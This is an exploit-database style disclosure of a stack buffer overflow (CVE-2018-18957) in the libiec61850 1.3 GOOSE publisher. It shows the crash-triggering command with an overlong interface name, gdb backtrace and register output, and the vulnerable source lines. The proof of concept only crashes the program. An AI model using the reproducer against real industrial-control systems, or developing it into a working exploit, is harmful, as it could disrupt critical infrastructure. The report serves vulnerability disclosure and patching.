@@ -1,0 +1,111 @@
+Exploit Title: libiec61850 1.3 - Stack Based Buffer Overflow
+# Date: 2018-11-06
+# Exploit Author: Dhiraj Mishra
+# Vendor Homepage: http://libiec61850.com/libiec61850/
+# Software Link: https://github.com/mz-automation/libiec61850
+# Version: 1.3
+# Tested on: Linux 4.15.0-38-generic
+# CVE: CVE-2018-18957
+# References:
+# https://github.com/mz-automation/libiec61850/issues/83
+# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18957
+
+# Summary
+# While fuzzing a stack based buffer overflow was found in libIEC61850 (the
+# open-source library for the IEC 61850 protocols) in prepareGooseBuffer in
+# goose/goose_publisher.c
+
+## Steps to reproduce
+
+$ ./goose_publisher_example crash_goosecr_stack_smash_overflow_aaaaaaaaa
+Using interface crash_goosecr_stack_smash_overflow_aaaaaaaaa
+*** stack smashing detected ***: <unknown> terminated
+Aborted
+$
+
+## Debugging
+
+(gdb) run crash_goosecr_stack_smash_overflow_aaaaaaaaa
+Starting program:
+/home/input0/Desktop/libiec61850/examples/goose_publisher/goose_publisher_example
+crash_goosecr_stack_smash_overflow_aaaaaaaaa
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Using interface crash_goosecr_stack_smash_overflow_aaaaaaaaa
+*** stack smashing detected ***: <unknown> terminated
+
+Program received signal SIGABRT, Aborted.
+__GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:51
+51    ../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
+(gdb) bt
+#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:51
+#1  0x00007ffff7805801 in __GI_abort () at abort.c:79
+#2  0x00007ffff784e897 in __libc_message (action=action@entry=do_abort,
+fmt=fmt@entry=0x7ffff797b988 "*** %s ***: %s terminated\n")
+    at ../sysdeps/posix/libc_fatal.c:181
+#3  0x00007ffff78f9cd1 in __GI___fortify_fail_abort
+(need_backtrace=need_backtrace@entry=false,
+    msg=msg@entry=0x7ffff797b966 "stack smashing detected") at
+fortify_fail.c:33
+#4  0x00007ffff78f9c92 in __stack_chk_fail () at stack_chk_fail.c:29
+#5  0x000055555555a211 in Ethernet_getInterfaceMACAddress
+(interfaceId=0x7fffffffdeee "crash_goosecr_stack_smash_overflow_aaaaaaaaa",
+    addr=0x7fffffffd91c "k_smas\377\377") at
+hal/ethernet/linux/ethernet_linux.c:170
+#6  0x00005555555594ee in prepareGooseBuffer (self=0x5555557637d0,
+parameters=0x7fffffffd9ac,
+    interfaceID=0x7fffffffdeee
+"crash_goosecr_stack_smash_overflow_aaaaaaaaa") at
+src/goose/goose_publisher.c:168
+#7  0x0000555555559293 in GoosePublisher_create (parameters=0x7fffffffd9ac,
+    interfaceID=0x7fffffffdeee
+"crash_goosecr_stack_smash_overflow_aaaaaaaaa") at
+src/goose/goose_publisher.c:72
+#8  0x0000555555555387 in main (argc=2, argv=0x7fffffffdaa8) at
+goose_publisher_example.c:52
+(gdb) i r
+rax            0x0    0
+rbx            0x7fffffffd6b0    140737488344752
+rcx            0x7ffff7803e97    140737345765015
+rdx            0x0    0
+rsi            0x7fffffffd410    140737488344080
+rdi            0x2    2
+rbp            0x7fffffffd840    0x7fffffffd840
+rsp            0x7fffffffd410    0x7fffffffd410
+r8             0x0    0
+r9             0x7fffffffd410    140737488344080
+r10            0x8    8
+r11            0x246    582
+r12            0x7fffffffd6b0    140737488344752
+r13            0x1000    4096
+r14            0x0    0
+r15            0x30    48
+rip            0x7ffff7803e97    0x7ffff7803e97 <__GI_raise+199>
+eflags         0x246    [ PF ZF IF ]
+cs             0x33    51
+ss             0x2b    43
+ds             0x0    0
+es             0x0    0
+fs             0x0    0
+gs             0x0    0
+(gdb)
+
+## src
+
+Snip : src/goose/goose_publisher.c
+
+{
+    GoosePublisher self = (GoosePublisher) GLOBAL_CALLOC(1, sizeof(struct
+sGoosePublisher));
+    prepareGooseBuffer(self, parameters, interfaceID);
+    self->timestamp = MmsValue_newUtcTimeByMsTime(Hal_getTimeInMs());
+    GoosePublisher_reset(self);
+    return self;
+}
+
+Snip: src/goose/goose_publisher.c
+
+    if (interfaceID != NULL)
+        Ethernet_getInterfaceMACAddress(interfaceID, srcAddr);
+    else
+Ethernet_getInterfaceMACAddress(CONFIG_ETHERNET_INTERFACE_ID, srcAddr);
